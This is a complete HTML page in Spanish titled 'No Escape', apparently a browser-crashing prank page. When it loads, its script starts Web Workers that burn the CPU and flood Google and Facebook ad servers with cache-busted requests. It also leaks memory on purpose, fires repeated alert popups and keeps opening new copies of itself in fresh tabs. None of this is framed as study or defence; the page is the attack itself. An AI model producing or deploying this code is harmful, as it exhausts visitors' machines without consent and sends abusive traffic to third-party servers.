<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>No Escape</title>
<style>
body{
  margin:0;
  background:black;
  color:#ff0000;
  font-family:monospace;
  overflow:hidden;
  text-align:center;
}
h1{
  margin-top:80px;
  font-size:5.5rem;
  animation: blink 0.25s infinite;
  text-shadow: 0 0 50px red;
}
#contador{
  font-size:3rem;
  margin:40px;
  text-shadow: 0 0 25px red;
}
@keyframes blink{ 50%{ opacity:0.08; } }
</style>
</head>
<body>
<h1>☢ NO ESCAPE ☢</h1>
<div id="contador">CPU/RAM siendo violada: 0%</div>

<canvas id="c1" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.25;"></canvas>
<canvas id="c2" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.20;"></canvas>

<script>
let total = 0;
let running = true;

// Matrix Rain
function createMatrix(id, speed) {
  const canvas = document.getElementById(id);
  const ctx = canvas.getContext("2d");
  
  function resize() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }
  resize();
  window.addEventListener("resize", resize);

  const chars = "0123456789ABCDEFアイウエオ$@#&";
  const fontSize = 14;
  let columns = canvas.width / fontSize;
  let drops = Array(Math.floor(columns)).fill(1);

  function draw() {
    ctx.fillStyle = "rgba(0,0,0,0.08)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#00ff00";
    ctx.font = fontSize + "px monospace";

    for(let i = 0; i < drops.length; i++) {
      ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fontSize, drops[i]*fontSize);
      if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    }
  }
  setInterval(draw, speed);
}

createMatrix("c1", 24);
createMatrix("c2", 17);

// Web Workers (reducidos para mayor durabilidad)
function createWorker() {
  const code = `
    self.onmessage = () => {
      setInterval(() => {
        for(let i = 0; i < 6; i++) {
          fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?t=" + Date.now() + Math.random(),
          {mode:"no-cors", cache:"no-store"}).catch(()=>{});
        }
        let x = 0;
        for(let j = 0; j < 60000; j++) x += Math.random() * Math.sin(j);
      }, 12);
    };
  `;
  const blob = new Blob([code], {type: "application/javascript"});
  try { new Worker(URL.createObjectURL(blob)).postMessage(""); } catch(e){}
}

// Spam principal más controlado
function spamPrincipal() {
  if (!running) return;

  const urls = [
    "https://securepubads.g.doubleclick.net/tag/js/gpt.js",
    "https://connect.facebook.net/en_US/fbevents.js",
    "https://googleads.g.doubleclick.net/pagead/ads"
  ];

  urls.forEach(url => {
    for(let i = 0; i < 4; i++) {
      const cb = "?t=" + Date.now() + Math.random();
      fetch(url + cb, {mode: "no-cors", cache: "no-store"}).catch(() => {});
      new Image().src = url + cb;
    }
  });

  // Memory leak más lento
  window.leakArray = (window.leakArray || []).concat(new Array(5000).fill({data: Math.random()}));

  total++;
  const porcentaje = Math.min(100, Math.floor(total / 7));
  document.getElementById("contador").innerText = `CPU/RAM siendo violada: ${porcentaje}%`;

  setTimeout(spamPrincipal, 12);
}

// Anti-escape
function antiEscape() {
  setInterval(() => {
    if(running) alert("NO ESCAPE\n\nEsta pestaña no quiere cerrarse...");
  }, 8000);
}

// === INICIO AUTOMÁTICO ===
window.onload = function() {
  // Workers
  for(let i = 0; i < 6; i++) createWorker();

  // Ráfaga inicial suave
  for(let i = 0; i < 60; i++) {
    setTimeout(spamPrincipal, i * 25);
  }

  spamPrincipal();
  antiEscape();

  // Intentar abrir más pestañas (cada 12 segundos)
  setInterval(() => {
    try { window.open(location.href, "_blank"); } catch(e){}
  }, 12000);
};
</script>
</body>
</html>
